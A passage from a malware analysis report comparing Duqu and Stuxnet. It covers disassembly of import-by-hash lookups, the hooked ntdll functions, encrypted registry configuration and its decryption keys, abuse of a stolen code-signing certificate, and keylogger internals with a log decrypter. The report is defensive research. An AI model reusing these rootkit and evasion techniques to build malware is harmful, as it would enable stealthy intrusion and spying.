FreeLibrary\n.text:100025FC         call  searchin_dll1_100022B6\n.text:10002601         pop   ecx\n.text:10002602         mov   ecx, [ebp+var_4]\n.text:10002605         mov   [ecx+28h], eax\n.text:10002608         push  5FC5AD65h    ; ZwCreateSection\n.text:1000260D         call  searchin_dll3_100022D8\n.text:10002612         pop   ecx\n.text:10002613         mov   ecx, [ebp+var_4]\n.text:10002616         mov   [ecx+2Ch], eax\n.text:10002619         push  1D127D2Fh    ; ZwMapViewOfSection\n.text:1000261E         call  searchin_dll3_100022D8\n.text:10002623         pop   ecx\n.text:10002624         mov   ecx, [ebp+var_4]\n.text:10002627         mov   [ecx+30h], eax\n.text:1000262A         push  6F8A172Dh    ; CreateThread\n.text:1000262F         call  searchin_dll1_100022B6\n.text:10002634         pop   ecx\n.text:10002635         mov   ecx, [ebp+var_4]\n.text:10002638         mov   [ecx+34h], eax\n.text:1000263B         push  0BF464446h   ; WaitForSingleObject\n.text:10002640         call  searchin_dll1_100022B6\n.text:10002645         pop   ecx\n.text:10002646         mov   ecx, [ebp+var_4]\n.text:10002649         mov   [ecx+38h], eax\n.text:1000264C         push  0AE16A0D4h   ; GetExitCodeThread\n.text:10002651         call  searchin_dll1_100022B6\n.text:10002656         pop   ecx\n.text:10002657         mov   ecx, [ebp+var_4]\n.text:1000265A         mov   [ecx+3Ch], eax\n.text:1000265D         push  0DB8CE88Ch   ; ZwClose\n.text:10002662         call  searchin_dll3_100022D8\n.text:10002667         pop   ecx\n.text:10002668         mov   ecx, [ebp+var_4]\n.text:1000266B         mov   [ecx+40h], eax\n.text:1000266E         push  3242AC18h    ; GetSystemDirectoryW\n.text:10002673         call  searchin_dll1_100022B6\n.text:10002678         pop   ecx\n.text:10002679         mov   ecx, [ebp+var_4]\n.text:1000267C         mov   [ecx+44h], eax\n.text:1000267F         push  479DE84Eh    ; CreateFileW\n.text:10002684         call  searchin_dll1_100022B6\n\n###### Sample 11 – netp191_res302 looking up imports in kernel32.dll\n\n 19 The content on this page has not been written by Symantec, \n\n\n-----\n\n.text:10002197         mov   ecx, [edx]\n.text:10002199         add   ecx, ebx\n.text:1000219B         mov   al, [ecx]\n.text:1000219D         mov   [ebp+var_8], 0F748B421h\n.text:100021A4         test  al, al\n.text:100021A6         jz   short loc_100021C3\n.text:100021A8\n.text:100021A8 loc_100021A8:              ; CODE XREF: search_export_by_hash_1000214A+74�j\n.text:100021A8         mov   ebx, [ebp+var_8]\n.text:100021AB         imul  ebx, 0D4C2087h\n.text:100021B1         movzx  eax, al\n.text:100021B4         xor   ebx, eax\n.text:100021B6         inc   ecx\n.text:100021B7         mov   al, [ecx]\n.text:100021B9         mov   [ebp+var_8], ebx\n.text:100021BC         test  al, al\n.text:100021BE         jnz   short loc_100021A8\n.text:100021C0         mov   ebx, [ebp+arg_0]\n.text:100021C3\n.text:100021C3 loc_100021C3:              ; CODE XREF: search_export_by_hash_1000214A+5C�j\n.text:100021C3         mov   eax, [ebp+var_8]\n.text:100021C6         cmp   [ebp+arg_4], eax ; compare argument magic to calculated hash\n.text:100021C9         jz   short loc_100021E0\n.text:100021CB         inc   [ebp+var_4]\n.text:100021CE         mov   eax, [ebp+var_4]\n.text:100021D1         add   edx, 4\n.text:100021D4         cmp   eax, [ebp+var_C]\n.text:100021D7         jb   short loc_10002197\n\n###### Sample 12 – Search loop and checksum calculation in cmi4432_res302 import by hash/checksum\n\n The checksum/hash calculation works on the export names without the terminating \\0 character. A constant is loaded first, then for each character of the name of the export, an imul is calculated over the partial hash and then the character is XORed to the result as shown above.\n\n While the trick of looking up import by hash is not unknown in malware code, this is another similarity between Duqu and Stuxnet. Note that the checksum calculation seems to be different between the two codes. Note also that many security related functions, such as SetSecurityDescriptorDacl, are imported as seen in the sample above, which are most likely related to the functionality of Stuxnet described in [SymantecDossier] (page 14).\n\n For the DLLs used by Duqu, we calculated the hash results. To simplify the work of others we uploaded the results to a publicly available web site, the download link is given in the Download section of this document.\n\n 20 The content on this page has not been written by Symantec, \n\n\n-----\n\n## 7. Hooks\n\n###### The hook functions work in the same way for Stuxnet and Duqu. They both use non‐existent “virtual” files for using libraries from modules.\n\n In case of Duqu, this is sort151C.nls (or similar with random two byte hex string created from the results of gettickcount() and process id) (Figure 8), while in case of Stuxnet it is KERNEL32.DLL.ASLR.[HEXSTRING] or SHELL32.DLL.ASLR.[HEXSTRING], where HEXSTRING is a two‐byte random hex string. When these libraries are requested, the corresponding module is loaded into the address space of the process (see Figure 10 from [EsetMicroscope] for more information). \n\n Figure 8 – The hooks of Duqu and the non‐existent emulated file\n\n 21 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### Figure 9 – The hooks of Stuxnet [EsetMicroscope]\n\n Figure and Table show that both threats hook the same ntdll.dll functions.\n\n Stuxnet Hook Duqu Hook\n\n ZwMapViewOfSection ZwMapViewOfSection\n\n ZwCreateSection ZwCreateSection\n\n ZwOpenFile ZwOpenFile\n\n ZwClose ZwClose\n\n ZwQueryAttributesFile ZwQueryAttributesFile\n\n ZwQuerySection ZwQuerySection\n\n Table 5 – The hooked functions of ntdll.dll are exactly the same in both malware codes.\n\n It is interesting, that antivirus programs do not detect this very strange functionality with non‐existent files and from the events we suppose to do changes in this field. During the injection Duqu maps read/write/execute memory areas to system processes like lsass.exe. It is also very strange that anti‐malware tools generally avoid to check these memory areas which are very rare to normal programs. So a general countermeasure might be to mitigate these issues.\n\n 22 The content on this page has not been written by Symantec, \n\n|Stuxnet Hook|Duqu Hook|\n|---|---|\n|ZwMapViewOfSection|ZwMapViewOfSection|\n|ZwCreateSection|ZwCreateSection|\n|ZwOpenFile|ZwOpenFile|\n|ZwClose|ZwClose|\n|ZwQueryAttributesFile|ZwQueryAttributesFile|\n|ZwQuerySection|ZwQuerySection|\n\n\n-----\n\n## 8. Payload and configuration encryption \n\n###### Both jminet7.sys and cmi4432.sys are generic loaders for malware code, in a very similar way as mrxcls.sys works in the case of Stuxnet. [Chappell 2010] discusses that the loader in the case of the Stuxnet is so general that it can be used to load any malware. The case is the same for Duqu components: both kernel drivers work in the same way so here we only explain the jminet7.sys process.\n\n The Windows boot up process starts jminet7.sys as it is defined in the registry in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\JmiNET3 (note the difference between jminet7 and JmiNET3). As jminet7.sys starts, it loads some configuration (Config 1) variables from the .sys file itself and decrypts it (Decrypt 1). The configuration (Config 1) contains the name of the registry key, where the variable configuration part is located, and the secret key to decrypt it. In our case, the “FILTER” key contains the configuration (Config 2) in binary encrypted form. (In case of Stuxnet the process is the same, but configuration (Config 2) is stored under the key “DATA”). Now, the loader, jminet7.sys reads the registry and decrypts configuration (Config 2 / Decrypt 2). This contains the name of the PNF file (DLL) and the process name where the file should be injected. Then, after 15 minutes of waiting time (not yet known if it is configurable or hard‐ coded) jminet7.sys loads and decrypts netp191.pnf (Decrypt 3).\n\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\JmiNET3]\n\"Description\"=\"JmiNET3\"\n\"DisplayName\"=\"JmiNET3\"\n\"ErrorControl\"=dword:00000000\n\"Group\"=\"Network\"\n\"ImagePath\"=\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\Drivers\\\\jminet7.sys\"\n\"Start\"=dword:00000001\n\"Type\"=dword:00000001\n\"FILTER\"=hex:a0,35,58,da,32,ee,d5,01,c0,15,8b,1f,4b,5c,d1,a1,0b,8b,e7,85,1c,7f,\\\n6e,f2,ef,31,6a,18,3c,80,78,c7,d4,c5,50,90,7a,78,66,9d,6b,93,00,a1,f5,3d,26,\\\nce,cb,1c,1e,45,b0,ff,a0,dd,c0,a3,e8,58,31,0c,b2,a1,dd,11,37,ba,aa,1e,66,d3,\\\n1f,b4,2f,e1,7c,eb,b6,a2,58,a0,25,62,77,b5,41,d3,71,02,1a,be,cb,bb,52,43,76,\\\n43,b6,d0,67,25,19,10,27,67,a5,15,38,9f,8f\n\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\JmiNET3\\Enum]\n\"0\"=\"Root\\\\LEGACY_JMINET3\\\\0000\"\n\"Count\"=dword:00000001\n\"NextInstance\"=dword:00000001\n\n###### Sample 13 – Registry data for jminet7\n\n During the starting process 3 decryption processes are performed altogether, exactly as in Stuxnet. Now, let’s compare the keys of the decryption operations.\n\n 23 The content on this page has not been written by Symantec, \n\n\n-----\n\n|Description|Key|\n|---|---|\n|Compiled‐in configuration (Config‐1)|No key set, fixed decryption routine (essentially the same as key=0)|\n|Variable configuration in registry (Config‐2)|0xAE240682 (loaded from Config‐1)|\n|Decryption key for netp191.pnf|0xAE240682 (loaded from Config‐2)|\n\n\n###### Keys in the case of Duqu (jminet7 and cmi4432)\n\n Description Key\n\n Compiled‐in configuration (Config‐1) key=0\n\n Variable configuration in registry (Config‐2) 0xAE240682 (loaded from Config‐1)\n\n Decryption key for oem7a.pnf 0x01AE0000 (loaded from Config‐2)\n\n Keys in the case of Stuxnet (mrxcls.sys)\n\n One can easily recognize that the same key is used in Stuxnet as in the case of Duqu. Note that many keys contain “0xAE” and later we show more occurrences of this magic number.\n\n 24 The content on this page has not been written by Symantec, \n\n|Description|Key|\n|---|---|\n|Compiled‐in configuration (Config‐1)|key=0|\n|Variable configuration in registry (Config‐2)|0xAE240682 (loaded from Config‐1)|\n|Decryption key for oem7a.pnf|0x01AE0000 (loaded from Config‐2)|\n\n\n-----\n\n0000000000: 07 00 00 00 82 06 24 AE │ 5C 00 52 00 45 00 47 00 •  '♠$R\\ R E G\n0000000010: 49 00 53 00 54 00 52 00 │ 59 00 5C 00 4D 00 41 00 I S T R Y \\ M A\n0000000020: 43 00 48 00 49 00 4E 00 │ 45 00 5C 00 53 00 59 00 C H I N E \\ S Y\n0000000030: 53 00 54 00 45 00 4D 00 │ 5C 00 43 00 75 00 72 00 S T E M \\ C u r\n0000000040: 72 00 65 00 6E 00 74 00 │ 43 00 6F 00 6E 00 74 00 r e n t C o n t\n0000000050: 72 00 6F 00 6C 00 53 00 │ 65 00 74 00 5C 00 53 00 r o l S e t \\ S\n0000000060: 65 00 72 00 76 00 69 00 │ 63 00 65 00 73 00 5C 00 e r v i c e s \\\n0000000070: 4A 00 6D 00 69 00 4E 00 │ 45 00 54 00 33 00 00 00 J m i N E T 3\n0000000080: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n0000000090: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000A0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000B0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000C0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000D0: 46 00 49 00 4C 00 54 00 │ 45 00 52 00 00 00 6C 00 F I L T E R  l\n00000000E0: 00 00 00 00 5C 00 44 00 │ 65 00 76 00 69 00 63 00   \\ D e v i c\n00000000F0: 65 00 5C 00 7B 00 33 00 │ 30 00 39 00 33 00 41 00 e \\ { 3 0 9 3 A\n0000000100: 41 00 5A 00 33 00 2D 00 │ 31 00 30 00 39 00 32 00 A Z 3 - 1 0 9 2\n0000000110: 2D 00 32 00 39 00 32 00 │ 39 00 2D 00 39 00 33 00 - 2 9 2 9 - 9 3\n0000000120: 39 00 31 00 7D 00 00 00 │ 00 00 00 00 00 00 00 00 9 1 }\n…\n\n###### Sample 14 – Decrypted Config‐1 for Duqu from jminet7.sys, key in yellow\n\n0000000000: 00 00 00 00 01 00 00 00 │ 10 BB 00 00 01 00 03 00   ☺ `►» ☺` `♥`\n0000000010: 82 06 24 AE 1A 00 00 00 │ 73 00 65 00 72 00 76 00 '♠$R→  s e r v\n0000000020: 69 00 63 00 65 00 73 00 │ 2E 00 65 00 78 00 65 00 i c e s . e x e\n0000000030: 00 00 38 00 00 00 5C 00 │ 53 00 79 00 73 00 74 00  8  \\ S y s t\n0000000040: 65 00 6D 00 52 00 6F 00 │ 6F 00 74 00 5C 00 69 00 e m R o o t \\ i\n0000000050: 6E 00 66 00 5C 00 6E 00 │ 65 00 74 00 70 00 31 00 n f \\ n e t p 1\n0000000060: 39 00 31 00 2E 00 50 00 │ 4E 00 46 00 00 00 D2   9 1 . P N F  Ň\n\n###### Sample 15 – Decrypted Config‐2 for Duqu jminet7.sys from registry\n\n We can see that the decryption and configuration processes of Duqu and Stuxnet are very similar. In both cases, the first decryption takes place just after the initialization of the driver, before checking for Safe mode and kernel Debug mode. In Stuxnet, the decryption is the call SUB_L00011C42, whereas in the case of Duqu it is the call SUB_L00011320 shown below.\n\n Stuxnet’s 1[st] decryption call  Duqu’s 1[st] decryption call\n\n L000103E1: L000105C4: mov byte ptr [L00014124],01h mov byte ptr [L00015358],01h mov dword ptr [ebp‐1Ch],L00013E80 mov esi,L00015180  L000103EF:  L000105D0: cmp dword ptr [ebp‐1Ch],L00013E84 mov [ebp‐1Ch],esi jnc L00010409 cmp esi,L00015184 mov eax,[ebp‐1Ch] jnc L000105E8 mov eax,[eax] mov eax,[esi] cmp eax,ebx test eax,eax jz  L00010403 jz  L000105E3 call eax call eax  L00010403:  L000105E3: add dword ptr [ebp‐1Ch],00000004h add esi,00000004h jmp L000103EF jmp L000105D0  L00010409:  L000105E8: xor eax,eax xor eax,eax L0001040B: L000105EA: cmp eax,ebx test eax,eax jnz L000104BA jnz L00010667\n\n 25 The content on this page has not been written by Symantec, \n\n|Stuxnet’s 1st decryption call|Duqu’s 1st decryption call|\n|---|---|\n|L000103E1: mov byte ptr [L00014124],01h mov dword ptr [ebp‐1Ch],L00013E80 L000103EF: cmp dword ptr [ebp‐1Ch],L00013E84 jnc L00010409 mov eax,[ebp‐1Ch] mov eax,[eax] cmp eax,ebx jz L00010403 call eax L00010403: add dword ptr [ebp‐1Ch],00000004h jmp L000103EF L00010409: xor eax,eax L0001040B: cmp eax,ebx jnz L000104BA|L000105C4: mov byte ptr [L00015358],01h mov esi,L00015180 L000105D0: mov [ebp‐1Ch],esi cmp esi,L00015184 jnc L000105E8 mov eax,[esi] test eax,eax jz L000105E3 call eax L000105E3: add esi,00000004h jmp L000105D0 L000105E8: xor eax,eax L000105EA: test eax,eax jnz L00010667|\n\n\n-----\n\n|mov al,[L00013E98] test al,al jz L00010433 xor eax,eax mov esi,00000278h mov ecx,L00013E99 call SUB_L00011C42 mov [L00013E98],bl L00010433: mov eax,[L00013E99] test al,01h jz L0001044C mov eax,[ntoskrnl.exe!InitSafeBootMode] cmp [eax],ebx jz L0001044C|mov edi,[ebp+0Ch] call SUB_L00011320 mov eax,[L00015190] test al,01h jz L00010611 mov ecx,[ntoskrnl.exe!InitSafeBootMode]|\n|---|---|\n\n\n###### Why does the decryption of the configuration (Config‐1) happen before the checks for Safe Mode and kernel debugging? The reason is probably that the behavior of the malware upon the detection of Safe Mode or kernel debugging is configurable; hence it needs the configuration (Config‐1) before the checking. The last bit of the first byte of the configuration (L00013E99 in Stuxnet listing above) controls if the malware should be active during safe mode or not, and if the 7th bit controls the same if kernel mode debugging is active. Duqu implements the same functionality with almost the same code.\n\n An important difference between the Stuxnet and the Duqu decryption calls is that in the case of Stuxnet calling the same subroutine does all three decryptions.  In the case of Duqu, the first decryption calls a slightly different routine, where the instruction mov ecx, 08471122h is used as shown below. For the other two decryption calls, this instruction is changed to XOR ecx, 08471122h. Thus, in the first case, ecx is a fixed decryption key, and in the other two cases, ecx contains a parameter received from the call.\n\n Stuxnet decryption routine Duqu decryption routine\n\n SUB_L00011C42: SUB_L00011320: push ebp push esi mov ebp,esp mov ecx,08471122h sub esp,00000010h xor esi,esi mov edx,eax jmp L00011330 xor edx,D4114896h Align 8 xor eax,A36ECD00h  L00011330: mov [ebp‐04h],esi xor [esi+L00015190],cl shr dword ptr [ebp‐04h],1 ror ecx,03h push ebx mov edx,ecx mov [ebp‐10h],edx imul edx,ecx mov [ebp‐0Ch],eax mov eax,1E2D6DA3h mov dword ptr [ebp‐08h],00000004h mul edx push edi mov eax,ecx\n\n 26 The content on this page has not been written by Symantec, \n\n|Stuxnet decryption routine|Duqu decryption routine|\n|---|---|\n|SUB_L00011C42: push ebp mov ebp,esp sub esp,00000010h mov edx,eax xor edx,D4114896h xor eax,A36ECD00h mov [ebp‐04h],esi shr dword ptr [ebp‐04h],1 push ebx mov [ebp‐10h],edx mov [ebp‐0Ch],eax mov dword ptr [ebp‐08h],00000004h push edi|SUB_L00011320: push esi mov ecx,08471122h xor esi,esi jmp L00011330 Align 8 L00011330: xor [esi+L00015190],cl ror ecx,03h mov edx,ecx imul edx,ecx mov eax,1E2D6DA3h mul edx mov eax,ecx|\n\n\n-----\n\n|L00011C6A: xor edx,edx test esi,esi jbe L00011C87 mov al,[ebp‐0Ch] imul [ebp‐08h] mov bl,al L00011C78: mov al,[ebp‐10h] imul dl add al,bl xor [edx+ecx],al inc edx cmp edx,esi jc L00011C78 L00011C87: xor eax,eax cmp [ebp‐04h],eax jbe L00011CA2 lea edx,[esi+01h] shr edx,1 lea edi,[edx+ecx] L00011C96: mov dl,[edi+eax] xor [eax+ecx],dl inc eax cmp eax,[ebp‐04h] jc L00011C96 L00011CA2: lea eax,[esi‐01h] jmp L00011CAF L00011CA7: mov dl,[eax+ecx‐01h] sub [eax+ecx],dl dec eax L00011CAF: cmp eax,00000001h jnc L00011CA7 dec [ebp‐08h] jns L00011C6A pop edi pop ebx leave retn|imul eax,04747293h shr edx,0Ch lea edx,[edx+eax+01h] add esi,00000001h xor ecx,edx cmp esi,000001ACh jc L00011330 mov ax,[L00015198] test ax,ax pop esi jnz L00011382 movzx ecx,[edi] mov edx,[edi+04h] push ecx push edx push L00015198 call jmp_ntoskrnl.exe!memcpy add esp,0000000Ch L00011382: retn|\n|---|---|\n\n\n###### Sample 16 – Decryption routine comparison\n\n 27 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### It is very hard to precisely characterize the similarities of the kernel driver codes of Duqu and Stuxnet. In the screenshot below, we present the registry loaders, and the decrypting part of the two. They are very similar, but there are clear differences. It is clearly interesting, but as we don’t have enough expertise, it would be just mere speculation from us to say which code is originated from which code, or if one code is based on the reverse‐engineering of the other, or, at the end, it is also possible that someone wanted to write a Stuxnet‐alike clone and he/she wanted to us to believe that the authors have relations. \n\n Figure 10 – registry loader and decrypting part. Left: Stuxnet – Right: Duqu loader \n\n 28 The content on this page has not been written by Symantec, \n\n\n-----\n\n## 9. PNF config file encryption\n\n###### In case of Stuxnet, a PNF file, mdmcpq3dd.pnf contains configuration information that is used by the payload (injected DLL), e.g. it contains the names of the Command & Control servers. This file in our Stuxnet sample is 6619 bytes long, and the first part of the configuration is encrypted by simple XOR with 0xFF. The last half of the configuration seems to be encrypted by different means.\n\n In Duqu, the configuration file is encrypted by XOR operations with the 7‐byte key (0x2b 0x72 0x73 0x34 0x99 0x71 0x98), the file is 6750 bytes long. Its content is not yet fully analyzed; it mainly contains strings about the system itself, but not the name of a C&C server.\n\n After decryption, Duqu checks if the file begins with 09 05 79 AE in hex (0xAE790509 as integer). We can thus observe another occurrence of the magic number AE. Note that Stuxnet’s config file mdmcpq3.pnf also begins with this magic number. Interestingly, the routine in Duqu also checks if the fifth byte is 0x1A. Moreover, at position 0xC, the decrypted config file repeats the size of the file itself (0x1A5E), where in case of Stuxnet, this size parameter only refers to the size of the first part of the configuration file (0x744 = 1860 bytes)\n\n 29 The content on this page has not been written by Symantec, \n\n\n-----\n\n## 10. Comparison of cmi4432.sys and jminet7.sys\n\n###### One could ask what is the difference between cmi4432.sys and jminet7.sys? The main difference is of course the digital signature. jminet7.sys is not signed, and thus, it is shorter. If we remove the digital signature from cmi4432.sys we find that both files are 24 960 bytes long.\n\n A basic binary comparison discovers only very tiny differences between the two codes. 2‐3 bytes are different in the header part, but then the code section is totally identical. The encrypted configuration sections inside the drivers are slightly different (as we know they contain references to different registry services). Finally, at the end of the driver binaries, the driver descriptive texts are different due to the references to JMicron and XXXXX as authors. C-Media\n\n In summary, we can conclude that jminet7.sys and cmi4432.sys are essentially identical, except for the identifiers and the digital signature. In addition, from their functionality we can assert that cmi4432.sys is a malware loader routine, so the digital signature on it cannot be intentional (by the manufacturer).\n\n## 11.Code signing and its consequence\n\n\n###### Digital signatures are used to assert the identity of the producer of software and the integrity of the code. Code signing is used to prevent untrusted code from being executed. Duqu’s cmi4432.sys is signed by XXXXX with a certificate that is still valid at the time of this\n C-Media\n writing (see related Figures). \n\n XXXXX's parent in the trust chain is Verisign Inc., the certificate was issued on 2009.08.03, it uses the SHA1 hash function (it's not MD5 which has known weaknesses), and it belongs to Class 3 certificates that provide a highest security level requiring for example physical presence at the enrollment. The timestamp is set to 1899.12.30, which probably signifies that no timestamp was given at the time of signing. \n\n Apparent similarities with the Stuxnet malware suggest that the private key of XXXXX might have been compromised and this calls for immediate revocation of their certificate invalidating the public key. Interestingly, in the Stuxnet case it was speculated that an insider's physical intrusion led to the compromise of the private keys of the involved hardware manufacturer companies RealTek and JMicron as they were both located in\n\n 30 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### Hsinchu Science and Industrial Park, Hsinchu City, Taiwan. Although the current compromise still affects a company in Taiwan, it is located in Taipei. There is no evidence for a large‐scale compromise of Taiwanese hardware manufacturers, but the recurrence of events is at least suspicious. \n C-Media\n Immediate steps are needed to mitigate the impact of the malware. Similar to the Stuxnet case, the certificate of XXXXX needs to be revoked and XXXXX’s code‐signing process must be thoroughly audited by Verisign Inc. or any other top‐level CA that would issue a new certificate for XXXXX. Revocation of the compromised certificate mitigates the spreading of the malware, because Windows does not allow new installations of the driver with a revoked certificate. This does not solve the problem completely, because already installed drivers may keep running.\n\n In the following pages we include some screenshots showing the digital signature on the affected malware kernel rootkit driver. In one of the figures, we also show that Windows stated that the certificate was still valid on October 5, 2011 with recent revocation information.\n\n Figure 11 – New CMI4432 rootkit loader with valid digital signature from XXXX,TW. Screenshot printed on October 5, 2011.\n\n 31 The content on this page has not been written by Symantec, \n\n\n-----\n\n## 12. Other components\n\n#### 12.1. Keylogger\n\n###### No direct network communication was observed from the keylogger.\n\n We checked the binary against virus scanner databases on some online tools. Interestingly, for GFI somebody already submitted the sample before we obtained a sample for the keylogger:\n\n http://www.sunbeltsecurity.com/cwsandboxreport.aspx?id=85625782&cs=F61AFBECF2457 197D1B724CB78E3276E\n\n In recent weeks, many virus scanners enlisted the software in their malware database.\n\n 32 The content on this page has not been written by Symantec, \n\n\n-----\n\n.text:00401B96 xorcryptor_b31f_at_401b96 proc near   ; CODE XREF: sub_401C86+13�p\n.text:00401B96                     ; loadsomemodule_401CE4+13�p ...\n.text:00401B96\n.text:00401B96 addr_ciphertext = dword ptr 4\n.text:00401B96 addr_target   = dword ptr 8\n.text:00401B96\n.text:00401B96         mov   edx, [esp+addr_ciphertext]\n.text:00401B9A         test  edx, edx\n.text:00401B9C         jnz   short loc_401BA8\n.text:00401B9E         mov   ecx, [esp+addr_target]\n.text:00401BA2         xor   eax, eax\n.text:00401BA4         mov   [ecx], ax\n.text:00401BA7         retn\n.text:00401BA8 ; --------------------------------------------------------------------------.text:00401BA8\n.text:00401BA8 loc_401BA8:               ; CODE XREF: xorcryptor_b31f_at_401b96+6�j\n.text:00401BA8         mov   eax, [esp+addr_target]\n.text:00401BAC         push  edi\n.text:00401BAD         mov   ecx, 0B31FB31Fh\n.text:00401BB2         jmp   short loc_401BC1\n.text:00401BB4 ; --------------------------------------------------------------------------.text:00401BB4\n.text:00401BB4 loc_401BB4:               ; CODE XREF: xorcryptor_b31f_at_401b96+34�j\n.text:00401BB4         cmp   word ptr [eax+2], 0\n.text:00401BB9         jz   short loc_401BCC\n.text:00401BBB         add   edx, 4\n.text:00401BBE         add   eax, 4\n.text:00401BC1\n.text:00401BC1 loc_401BC1:               ; CODE XREF: xorcryptor_b31f_at_401b96+1C�j\n.text:00401BC1         mov   edi, [edx]\n.text:00401BC3         xor   edi, ecx\n.text:00401BC5         mov   [eax], edi\n.text:00401BC7         test  di, di\n.text:00401BCA         jnz   short loc_401BB4 ; String is terminated by 00 characters, that stops\ndecryption\n.text:00401BCC\n.text:00401BCC loc_401BCC:               ; CODE XREF: xorcryptor_b31f_at_401b96+23�j\n.text:00401BCC         pop   edi\n.text:00401BCD         retn\n.text:00401BCD xorcryptor_b31f_at_401b96 endp\n\n###### Sample 17 – B3 1F XOR encryption routine from keylogger\n\n1000E4D1              L1000E4D1:\n1000E4D1 8B442408 mov eax,[esp+08h]\n1000E4D5 57 push edi\n1000E4D6 B91FB31FB3 mov ecx,B31FB31Fh\n1000E4DB EB0D jmp L1000E4EA\n1000E4DD              L1000E4DD:\n1000E4DD 6683780200 cmp word ptr [eax+02h],0000h\n1000E4E2 7411 jz L1000E4F5\n1000E4E4 83C204 add edx,00000004h\n1000E4E7 83C004 add eax,00000004h\n1000E4EA              L1000E4EA:\n1000E4EA 8B3A mov edi,[edx]\n1000E4EC 33F9 xor edi,ecx\n1000E4EE 8938 mov [eax],edi\n1000E4F0 6685FF test di,di\n1000E4F3 75E8 jnz L1000E4DD\n1000E4F5              L1000E4F5:\n1000E4F5 5F pop edi\n1000E4F6 C3 retn\n\n###### Sample 18 – B3 1F XOR encryption routine from cmi4432.pnf\n\n 33 The content on this page has not been written by Symantec, \n\n\n-----\n\nv9 = pNumArgs;\nif ( pNumArgs > 1 && !lstrcmpiW(*(LPCWSTR *)(commandlineparam + 4), L\"xxx\") )\n{\nv22 = 2;\nwhile ( v22 < v9 )\n{\nv4 = 0;\nif ( !check_options_sub_4013AE((int)&v22, v9, commandlineparam, (int)&v14) )\ngoto LABEL_13;\n}\nif ( createfile_stuff((int)&v14) && tempfile_eraser((int)&v14) && sub_401160((int)&v14, (int)&Memory,\n(int)&v22) )\n{\nif ( sub_401269(Memory, v22) )\n{\nv10 = 1;\nv4 = 0;\ngoto LABEL_14;\n}\nv4 = 0;\n}\n}\nLABEL_13:\n\n###### Sample 19 – Keylogger – does not start if the first parameter is not “xxx”\n\nv4 = *(_DWORD *)(a3 + 4 * *(_DWORD *)a1);\nif ( *(_WORD *)v4 == 47 )\n{\nv6 = (const WCHAR *)(v4 + 2);\n++*(_DWORD *)a1;\nif ( lstrcmpiW(v6, L\"delme\") )\n{\nif ( lstrcmpiW(v6, L\"v\") )\n{\nif ( lstrcmpiW(v6, L\"quit\") )\n{\nif ( lstrcmpiW(v6, L\"restart\") )\n{\nresult = sub_401000(a3, a1, a4, v6, a2);\n}\nelse\n{\nresult = 1;\n*(_DWORD *)(a4 + 12) = 1;\n}\n}\n\n###### Sample 20 – valid options – not tested furthermore\n\n 34 The content on this page has not been written by Symantec, \n\n\n-----\n\nsigned int __userpurge sub_401000<eax>(int a1<edx>, int a2<ecx>, int a3<ebx>, LPCWSTR lpString1, int a5)\n{\nint v5; // eax@1\nint v7; // edi@3\n\nv5 = *(_DWORD *)a2;\nif ( *(_DWORD *)a2 >= a5 )\nreturn 0;\nv7 = *(_DWORD *)(a1 + 4 * v5);\n*(_DWORD *)a2 = v5 + 1;\nif ( !lstrcmpW(lpString1, L\"in\") )\n{\n*(_DWORD *)(a3 + 16) = v7;\nreturn 1;\n}\nif ( !lstrcmpW(lpString1, L\"out\") )\n{\n*(_DWORD *)(a3 + 32) = v7;\nreturn 1;\n}\nreturn 0;\n}\n\n###### Sample 21 – and some more options\n\n The keylogger.exe file contains an embedded jpeg file from position 34440 (in bytes). The picture is only partial, the readable text shows “Interacting Galaxy System NGC 6745”, most likely a picture taken from NASA and used as deception. At position 42632 an encrypted DLL can be found. The encryption is simple XOR with 0xFF.\n\n The unencrypted DLL is (as in the other cases) a compressed UPX file. According to the call graph, most likely, the “outer” .exe is just a control program and injector to this internal part, and the internal DLL contains keylogging related function calls.\n\n Figure 12 – Structure of the interal DLL of keylogger shows wide functionality \n\n 35 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### Interesting function calls: GetIPForwardTable, GetIpNetTable, GetWindowTextW, CreateCompatiblebitmap, GetKeyState, NetfileEnum, etc.\n\n 12.1.1. Keylogger file format\n\n The keylogger stores data in the %TEMP% directory of the target computer. The file begins with hex AD 34 00 and generally resides in the User/… /Appdata/Local/Temp OR Documents and Settings/ …/Local data/temp directory.\n\n Strings “AEh91AY” in the file are modified bzip headers, whose parts can be decompressed after extracting and modifying it back to “BZh91AY”. Note that the magic number, AE appears again in the code.\n\n Another type of this binary file begins with ”ABh91AY”, which is a bzip2 compressed file containing a number of files in cleartext, like a tar file (but simpler format). The uncompressed file begins with string “ABSZ” and the name of the source computer.\n\n 36 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### The keylogger file is a variable‐size record based format and it begins with 0xAD 0x34.\n\ntypedef struct tagDQH1 {\nunsigned char magic;\nunsigned char type;\nunsigned char unk1;\nunsigned char unk2;\ntime_t ts;\nunsigned long len;\n} DQH1;\n\ntypedef struct tagDQHC0 {\nunsigned long lenu;\nunsigned char zipm[8];\n} DQHC0;\n\n###### Sample 22 – header structures for keylog file\n\n At the beginning of each block, the file contains a tagDQH1 structure, where magic=0xAD. This is valid for the beginning of the file (offset=0) as well. \n\n If the next block is compressed (that is if the zipm (“zip magic”) part begins with “AEh91AY&SY” meaning that this part is a bzip2 compressed part), then tagDQHC0 block follows, where lenu contains the length of the compressed part. \n\n If the “zip magic” is missing, then the block is in a different format and the tagDQH1 information can be used for length information.\n\n Otherwise, the block of the keylog file are XOR encrypted which can be decrypted by the following routine:\n\nfor(i=offset-1;i > 0;i--) {\nxb[i]^=xb[i-1];\n}\nxb[0]^=0xA2;\n\n###### Sample 23 – XOR decrypter for keylogger log files\n\n The contents of the parts can be different: Information on the disk drives, network shares, TCP table, information on running processes, names of the active window on the screen, screenshots in bitmap, etc.\n\n 37 The content 